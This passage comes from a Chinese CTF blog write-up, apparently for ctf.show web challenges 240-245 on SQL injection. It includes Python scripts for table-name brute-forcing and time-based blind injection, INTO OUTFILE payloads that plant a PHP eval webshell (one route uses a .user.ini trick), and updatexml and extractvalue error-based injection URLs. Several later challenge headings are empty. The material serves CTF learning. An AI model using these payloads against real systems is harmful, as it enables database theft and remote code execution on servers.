<pre><code>username=',(select(flag)from(flagbb)));#&amp;password=1
</code></pre> 
<h2><a id="web_240_1473"></a>web 240</h2> 
<p>根据题目的意识，应该是爆破表名，这边就贴一下 mumuzi 大佬的脚本，自己写的太<s>拉</s> 了，学到了一种全排列的写法，nice！</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> itertools


url <span class="token operator">=</span> <span class="token string">'http://c04a7d0b-a231-47f6-bc6e-06b5a3b15acd.challenge.ctf.show/api/insert.php'</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span><span class="token string">'ab'</span><span class="token punctuation">,</span>repeat <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag <span class="token operator">=</span> <span class="token string">'flag'</span><span class="token operator">+</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
        <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"',(select(flag)from(</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>flag<span class="token punctuation">}</span></span><span class="token string">)));#"</span></span><span class="token punctuation">,</span>
        <span class="token string">'password'</span><span class="token punctuation">:</span><span class="token number">1</span>
    <span class="token punctuation">}</span>
    req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
</code></pre> 
<h2><a id="web_241_1492"></a>web 241</h2> 
<p>用时间盲注，如果是布尔的话还没注完，表就被删光了。<br> <img src="https://images2.imgbox.com/26/dc/Ps3DxTXI_o.png" alt="在这里插入图片描述"></p> 
<pre><code>import requests
import time

url = "http://401d77e4-40a8-4dbf-83e1-d1f8d3e62e7e.challenge.ctf.show/api/delete.php"

name = ""
i = 0
while True:
    head = 32
    tail = 127
    i += 1
    while (head &lt; tail):
        time.sleep(0.3)
        mid = head + tail &gt;&gt; 1
        payload = f"if(ascii(substr((select group_concat(flag) from flag),{i},1))&gt;{mid},sleep(0.02),55)#"
        data = {
            'id': payload
        }
        time1 = time.time()
        r = requests.post(url, data=data)
        time2 = time.time()
        if (time2-time1) &gt; 0.4:
            head = mid + 1
        else:
            tail = mid
    if head != 32:
        name += chr(head)
        print(ascii(name))
    else:
        continue
</code></pre> 
<h2><a id="web_242__file__1528"></a>web 242 – file 注入</h2> 
<p>可以用可选参数写入 shell</p> 
<pre><code class="prism language-php"><span class="token constant">SELECT</span> <span class="token operator">...</span> <span class="token constant">INTO</span> <span class="token constant">OUTFILE</span> <span class="token string single-quoted-string">'file_name'</span>
        <span class="token punctuation">[</span><span class="token constant">CHARACTER</span> <span class="token constant">SET</span> charset_name<span class="token punctuation">]</span>
        <span class="token punctuation">[</span>export_options<span class="token punctuation">]</span>

export_options<span class="token punctuation">:</span>
    <span class="token punctuation">[</span><span class="token punctuation">{<!-- --></span><span class="token class-name">FIELDS</span> <span class="token operator">|</span> <span class="token class-name">COLUMNS</span><span class="token punctuation">}</span>
        <span class="token punctuation">[</span><span class="token constant">TERMINATED</span> <span class="token constant">BY</span> <span class="token string single-quoted-string">'string'</span><span class="token punctuation">]</span><span class="token comment">//分隔符</span>
        <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token constant">OPTIONALLY</span><span class="token punctuation">]</span> <span class="token constant">ENCLOSED</span> <span class="token constant">BY</span> <span class="token string single-quoted-string">'char'</span><span class="token punctuation">]</span>
        <span class="token punctuation">[</span><span class="token constant">ESCAPED</span> <span class="token constant">BY</span> <span class="token string single-quoted-string">'char'</span><span class="token punctuation">]</span>
    <span class="token punctuation">]</span>
    <span class="token punctuation">[</span><span class="token constant">LINES</span>
        <span class="token punctuation">[</span><span class="token constant">STARTING</span> <span class="token constant">BY</span> <span class="token string single-quoted-string">'string'</span><span class="token punctuation">]</span>
        <span class="token punctuation">[</span><span class="token constant">TERMINATED</span> <span class="token constant">BY</span> <span class="token string single-quoted-string">'string'</span><span class="token punctuation">]</span>
    <span class="token punctuation">]</span>

<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
“<span class="token constant">OPTION</span>”参数为可选参数选项，其可能的取值有：

<span class="token constant">FIELDS</span> <span class="token constant">TERMINATED</span> <span class="token constant">BY</span> <span class="token string single-quoted-string">'字符串'</span>：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。

<span class="token constant">FIELDS</span> <span class="token constant">ENCLOSED</span> <span class="token constant">BY</span> <span class="token string single-quoted-string">'字符'</span>：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。

<span class="token constant">FIELDS</span> <span class="token constant">OPTIONALLY</span> <span class="token constant">ENCLOSED</span> <span class="token constant">BY</span> <span class="token string single-quoted-string">'字符'</span>：设置字符来括住<span class="token constant">CHAR</span>、<span class="token constant">VARCHAR</span>和<span class="token constant">TEXT</span>等字符型字段。默认情况下不使用任何符号。

<span class="token constant">FIELDS</span> <span class="token constant">ESCAPED</span> <span class="token constant">BY</span> <span class="token string single-quoted-string">'字符'</span>：设置转义字符，只能为单个字符。默认值为“\”。

<span class="token constant">LINES</span> <span class="token constant">STARTING</span> <span class="token constant">BY</span> <span class="token string single-quoted-string">'字符串'</span>：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。

<span class="token constant">LINES</span> <span class="token constant">TERMINATED</span> <span class="token constant">BY</span> <span class="token string single-quoted-string">'字符串'</span>：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。


</code></pre> 
<p>payload：</p> 
<pre><code class="prism language-php">api<span class="token operator">/</span>dump<span class="token operator">.</span>php
filename<span class="token operator">=</span><span class="token number">1.</span>php' <span class="token constant">LINES</span> <span class="token constant">STARTING</span> <span class="token constant">BY</span> <span class="token string double-quoted-string">"&lt;?php eval(<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></span>);?&gt;"</span><span class="token punctuation">;</span><span class="token comment">#</span>
</code></pre> 
<p>在 dump/1.php 处getshell</p> 
<h2><a id="web_243_1569"></a>web 243</h2> 
<p>过滤了php，可以传 ini 加图片马</p> 
<p>在开头和结尾加 0x0a 换行，保证 auto_prepend_file=1.jpg 在单独一行</p> 
<pre><code class="prism language-php">filename<span class="token operator">=</span><span class="token operator">.</span>user<span class="token operator">.</span>ini<span class="token string single-quoted-string">' LINES STARTING BY '</span><span class="token punctuation">;</span>' <span class="token constant">TERMINATED</span> <span class="token constant">BY</span> <span class="token number">0x0a6175746f5f70726570656e645f66696c653d312e706e670a</span><span class="token punctuation">;</span><span class="token comment">#</span>
</code></pre> 
<p>传图片马</p> 
<pre><code class="prism language-php">filename<span class="token operator">=</span><span class="token number">1.</span>jpg<span class="token string single-quoted-string">' LINES STARTING BY '</span><span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">&gt;</span>'<span class="token comment">#</span>
</code></pre> 
<p>最后</p> 
<pre><code class="prism language-php"><span class="token operator">/</span>dump<span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token operator">?</span><span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /flag.here'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<h2><a id="web_244_1587"></a>web 244</h2> 
<p>报错注入</p> 
<pre><code>api/?id=1' or updatexml(1,concat(0x7e,database(),0x7e),1)%23

api/?id=1' or updatexml(1,concat(0x7e,substr((select group_concat(flag) from ctfshow_flag),1,32),0x7e),1)%23

api/?id=1' or updatexml(1,concat(0x7e,(select left(flag,32) from ctfshow_flag),0x7e),1)%23

api/?id=1' or updatexml(1,concat(0x7e,(select right(flag,32) from ctfshow_flag),0x7e),1)%23
</code></pre> 
<h2><a id="web_245_1601"></a>web 245</h2> 
<p>同上报错注入</p> 
<pre><code>api/?id=1' or extractvalue(1,concat(0x7e,substr((select group_concat(flag1) from ctfshow_flagsa),1,30),0x7e))+--+
api/?id=1' or extractvalue(1,concat(0x7e,substr((select group_concat(flag1) from ctfshow_flagsa),20,30),0x7e))+--+
</code></pre> 
<h2><a id="web_246_1609"></a>web 246</h2> 
<h2><a id="web_247_1610"></a>web 247</h2> 
<h2><a id="web_248_1611"></a>web 248</h2> 
<h2><a id="web_249_1612"></a>web 249</h2> 
<h2><a id="web_250_1613"></a>web 250</h2> 
<h2><a id="web_251_1614"></a>web 251</h2> 
<h2><a id="web_252_1615"></a>web 252</h2> 
<h2><a id="web_253_1616"></a>web 253</h2> 
<h2><a id="reference_1618"></a>reference</h2> 
<p><a href="https://blog.csdn.net/qq_42880719/article/details/122461256">是mumuzi</a><br> <a href="https://blog.csdn.net/solitudi/article/details/110144623">Y4tacker</a></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/3f98c4f87c786e59074dcca8cb855ce4/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">MySQL进阶-单列索引与联合索引</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/bd681bce4dcbb2e8164b1c1150f59816/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Linux 查询正在运行的shell脚本命令</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>